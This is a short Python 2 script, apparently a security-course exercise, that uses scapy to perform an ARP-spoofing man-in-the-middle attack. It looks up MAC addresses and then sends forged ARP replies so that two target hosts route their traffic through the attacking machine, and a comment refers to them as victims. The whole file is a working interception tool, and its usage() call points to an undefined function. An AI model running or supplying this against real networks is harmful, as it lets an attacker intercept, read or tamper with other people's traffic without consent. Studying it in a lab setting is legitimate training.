#!/usr/bin/python
import sys
import socket  # Will use this to get IP Address of the current host
from uuid import getnode as get_mac  # Will use this to get the MAC address of the device runnning the script
from scapy.all import *

################################################
# SPSE Module 3. Lesson 8. Ex.2
# Create an ARP MiTM tool. 
# Usage: Scapy_ARP_MiTM.py IP1 IP2
# This tool creates a MiTM, locating the computer that executes the script in 
# the middle of the communication between IP1 and IP2
#
################################################

def get_my_mac():
  print '#'*13
  print 'Getting MAC Address of current device'
  my_mac = hex(get_mac())
  my_macf = my_mac[2:-1]
  my_macf = my_macf[0:2] + ':' + my_macf[2:4] + ':' + my_macf[4:6] + ':' + my_macf[6:8] + ':' + my_macf[8:10] + ':' + my_macf[10:12]
  print '-[My MAC Addr]: %s' %(my_macf) 
  print '#'*13
  return my_macf

def get_mac_addrs(ip1, ip2):
  print '#'*13
  print 'Getting MAC Addresses of target devices'
  # Sending an ARP request to retrieve the MAC addresses of our victims, muahahahaha
  my_macf = get_my_mac()
  # op = 1 means ARP request
  pk1 = ARP(op = 1, hwsrc = my_macf, pdst = ip1)
  pk2 = ARP(op = 1, hwsrc = my_macf, pdst = ip2)
  ans1, unans1 = sr(pk1)
  ans2, unans2 = sr(pk2)
  mac1 = ans1[0][1].hwsrc 
  mac2 = ans2[0][1].hwsrc 
  print '-[MAC of %s]: %s' %(ip1, mac1)
  print '-[MAC of %s]: %s' %(ip2, mac2)
  print '#'*13
  return (mac1, mac2)

def arp_mitm(ip1, ip2):
  my_ip = socket.gethostbyname(socket.gethostname())
  my_macf = get_my_mac()
  (mac1, mac2) = get_mac_addrs(ip1, ip2)
  # op = 2 means ARP reply, psrc means SourceIPField, 
  pkt1 = ARP(op = 2, hwsrc = my_macf, psrc = ip1, hwdst = mac2, pdst = ip2) 
  pkt2 = ARP(op = 2, hwsrc = my_macf, psrc = ip2, hwdst = mac1, pdst = ip1)
  send(pkt1) 
  send(pkt2)
  print '#'*13
  print 'ARP Spoof Successful!!' 
  print '#'*13

def main():
  if len(sys.argv) < 3:
    usage()
  else:
    args = sys.argv[1:]
    ip1 = str.strip(args[0])
    ip2 = str.strip(args[1])
    arp_mitm(ip1, ip2)

if __name__ == '__main__':
  main()
